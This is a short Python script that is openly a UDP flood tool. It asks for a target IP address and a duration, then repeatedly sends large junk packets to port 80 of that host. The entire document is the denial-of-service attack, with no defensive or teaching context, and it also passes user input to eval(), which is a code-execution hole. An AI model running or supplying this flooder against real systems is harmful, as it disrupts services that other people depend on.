import socket
import time,random
randstr = "I'm attacking you."*500
randdata = randstr.encode()
def main(): 
    ip_address = input("input ip address you want to attack, eg.(127.0.0.1) \n")
    attack_second = eval(input("for how long you want to attack the server in second eg.(10) \n"))
    port = 80
    start_second= time.time();

    so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    
    while True:
        if ((time.time() - start_second) >= attack_second):
            break
        
        print(ip_address+ " is now being attacked")
        so.sendto(randdata,(ip_address,port))
    print(ip_address + " attack completed")
        

main()
